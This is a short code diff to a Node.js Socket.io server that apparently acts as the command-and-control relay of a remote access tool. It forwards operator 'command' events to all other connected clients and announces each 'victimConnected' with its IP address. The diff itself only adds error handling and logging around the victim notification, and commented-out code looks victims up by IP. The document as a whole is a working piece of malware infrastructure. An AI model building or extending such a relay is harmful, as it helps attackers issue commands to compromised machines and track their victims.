@@ -47,12 +47,16 @@ const io = socket(server, {
 
 
 io.on("connection", (socket) => {
-  console.log("user connected")
   socket.on("command", (data) => {
       socket.broadcast.emit("server_send_command", data)
   })
   socket.on("information", async(data) => {
-      socket.broadcast.emit("victimConnected", {ip : socket.ip})
+      try {
+        console.log(`user connected ${socket.ip}`)
+        socket.broadcast.emit("victimConnected", {ip : socket.ip})
+      } catch(err) {
+        console.log(err.message)
+      }
       // const check_user = await USER.findOne({ip_address : data.data[5]})
       // socket.ip = data.data[5]
       // if (check_user) {
